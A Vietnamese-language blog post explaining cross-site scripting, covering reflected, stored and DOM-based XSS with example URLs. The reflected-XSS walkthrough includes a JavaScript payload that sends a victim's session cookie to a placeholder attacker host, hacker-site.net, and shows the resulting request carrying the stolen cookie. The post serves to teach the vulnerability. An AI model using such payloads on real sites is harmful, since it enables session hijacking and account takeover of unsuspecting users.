---
layout: post
title: Cross Site Scripting - XSS Attack
description: "Attack Method: XSS (Cross Site Scripting)"
headline: 
modified: 2018-02-13
category: network
tags: [XSS]
imagefeature: cover/macos/008.jpg
mathjax:
chart:
share: true
# comments: true
# featured: true
highlight: true
---

Attack Method: XSS (Cross Site Scripting)

Language: Vietnamese

## XSS - Cross-Site Scripting
Cross-Site Scripting (XSS) là một trong những kĩ thuật tấn công phổ biến nhất hiên nay, đồng thời nó cũng là một trong những vấn đề bảo mật quan trọng đối với các nhà phát triển web và cả những người sử dụng web. Bất kì một website nào cho phép người sử dụng đăng thông tin mà không có sự kiểm tra chặt chẽ các đoạn mã nguy hiểm thì đều có thể tiềm ẩn các lỗi XSS.

### Giới thiệu
Cross-Site Scripting hay còn được gọi tắt là XSS (thay vì gọi tắt là CSS để tránh nhầm lẫn với CSS-Cascading Style Sheet của HTML) là một kĩ thuật tấn công bằng cách chèn vào các website động (ASP, PHP, CGI, JSP …) những thẻ HTML hay những đoạn mã script nguy hiểm có thể gây nguy hại cho những nạn nhân sử dụng.

### Cách hoạt động
Lỗi này xảy ra khi ứng dụng web thu nhận các dữ liệu nguy hiểm được nhập từ hacker. Một website thường chứa các link, thông qua các link này hacker có thể chèn các đoạn code vào và khi người dùng nào đó sử dụng link này thì coi như 99% là chết, hacker có thể thông qua lỗi này để chèn code vào site hay link để lấy các thông tin quan trọng từ nạn nhân



Phụ thuộc vào mục đích của hacker, những đoạn Javascript được chèn vào để lấy những thông tin như:

+ Cookie: hacker có thể lấy được cookie của người dùng và dùng những thông tin trong cookie để giả mạo phiên truy cập hoặc lấy những thông tin nhạy cảm khác được lưu trong cookie.
+ Keylogging: hacker có thể ghi lại những thao tác gõ phím của người dùng bằng cách sử dụng sự kiện trong Javascript và gửi tất cả những thao tác gõ phím đó về cho hắn để thực hiện những mục đích như đánh cắp các thông tin nhạy cảm, lấy mật khẩu truy cập website hoặc mã số thẻ tín dụng…
+ Phishing: hacker có thể thay đổi giao diện của website bằng cách thay đổi cấu trúc HTML trong trang web để đánh lừa người dùng. Hacker có thể tạo ra những form đăng nhập giả nhằm lừa người dùng đăng nhập vào để đánh cắp mật khẩu.

Sau đó các thông tin này được gửi tới cho hacker . Cách thường dùng của hacker là mã hoá các phần nguy hiểm của link ( đã chèn code) thành kiểu HEX ( hoặc có thể là các hình thức khác ) để làm cho nạn nhân ít nghi ngờ khi click vào cái link nguy hiểm đó . Sau đó là tìm cách nào đó để cho nạn nhân chịu click vào cái link đó.

Hầu hết các ứng dụng web hiện nay dùng cookie để kết hợp 1 tài khoản duy nhất cho 1 người dùng nào đó , nghĩa là cookie của người nào người đó dùng . Các webmail , web bán hàng , nhà băng , … đa số đều dùng cookie với mục đích chứng thực ngừơi dùng , và đây là cái mà hacker cần.

### Vi dụ
Ví dụ url có chứp đoạn mã script
```html
http://www.example.com/search.cgi?query=<script>alert(‘Website đang bị lỗi XSS!’);</script>.
```
Xuất hiện alert => bị lỗ hổng XSS

## Phân loại XSS
Phân loại: Có 3 loại Reflected XSS, Stored XSS và DOM-based XSS

### Reflected XSS
Ở kịch bản này, hacker sẽ gửi cho nạn nhân một URL có chứa đoạn mã nguy hiểm. Nạn nhân chỉ cần gửi request đến URL này thì hacker sẽ có được kết quả mong muốn. Cụ thể:
1. Người dùng đăng nhập web và giả sử được gán session: 
```
Set-Cookie: sessId=5e2c648fa5ef8d653adeede595dcde6f638639e4e59d4
```
2. Bằng cách nào đó, hacker gửi được cho người dùng URL:
```
http://example.com/name=var+i=new+Image;+i.src=”http://hacker-site.net/”%2bdocument.cookie;
```
Giả sử `example.com` là website nạn nhân truy cập, `hacker-site.net` là trang của hacker tạo ra
3. Nạn nhân truy cập đến URL trên
4. Server phản hồi cho nạn nhân, kèm với dữ liệu có trong request(đoạn javascript của hacker)
5. Trình duyệt nạn nhân nhận phản hồi và thực thi đoạn javascript
6. Đoạn javascript mà hacker tạo ra thực tế như sau: 
```js
var i = new Image; i.src = 'http://hacker-site.net/' + document.cookie;
```
Dòng lệnh trên bản chất thực hiện request đến site của hacker với tham số là cookie người dùng:
```
GET /sessId=5e2c648fa5ef8d653adeede595dcde6f638639e4e59d4 HTTP/1.1
Host: hacker-site.net
```
7. Từ phía site của mình, hacker sẽ bắt được nội dung request trên và coi như session của người dùng sẽ bị chiếm. Đến lúc này, hacker có thể giả mạo với tư cách nạn nhân và thực hiện mọi quyền trên website mà nạn nhân có.

### Stored XSS
Khác với Reflected tấn công trực tiếp vào một số nạn nhân mà hacker nhắm đến, Stored XSS hướng đến nhiều nạn nhân hơn. Lỗi này xảy ra khi ứng dụng web không kiểm tra kỹ các dữ liệu đầu vào trước khi lưu vào cơ sở dữ liệu (ở đây tôi dùng khái niệm này để chỉ database, file hay những khu vực khác nhằm lưu trữ dữ liệu của ứng dụng web). Ví dụ như các form góp ý, các comment … trên các trang web.

Với kỹ thuật Stored XSS , hacker không khai thác trực tiếp mà phải thực hiện tối thiểu qua 2 bước.
+ Đầu tiên hacker sẽ thông qua các điểm đầu vào (form, input, textarea…) không được kiểm tra kỹ để chèn vào CSDL các đoạn mã nguy hiểm.
+ Tiếp theo, khi người dùng truy cập vào ứng dụng web và thực hiện các thao tác liên quan đến dữ liệu được lưu này, đoạn mã của hacker sẽ được thực thi trên trình duyệt người dùng.

### DOM Based XSS
DOM Based XSS là kỹ thuật khai thác XSS dựa trên việc thay đổi cấu trúc DOM của tài liệu, cụ thể là HTML. Chúng ta cùng xem xét một ví dụ cụ thể sau.

Một website có URL đến trang đăng ký như sau:
```
http://example.com/register.php?message=Please fill in the form
```

Khi truy cập đến thì chúng ta thấy một Form rất bình thường. Tuy nhiên nếu đổi thành
```
http://example.com/register.php?message=<label>Gender</label><div class="col-sm-4">MaleFemale</div>function show(){alert();}
```
Người dùng sẽ chẳng chút nghi ngờ với một form “bình thường” như thế này, và khi lựa chọn giới tính, Script sẽ được thực thi


## Tham khảo


[https://techtalk.vn/ki-thuat-tan-cong-cross-site-scripting.html](https://techtalk.vn/ki-thuat-tan-cong-cross-site-scripting.html)

[https://labs.septeni-technology.jp/security/tim-hieu-ve-lo-hong-cross-site-scripting/](https://labs.septeni-technology.jp/security/tim-hieu-ve-lo-hong-cross-site-scripting/)
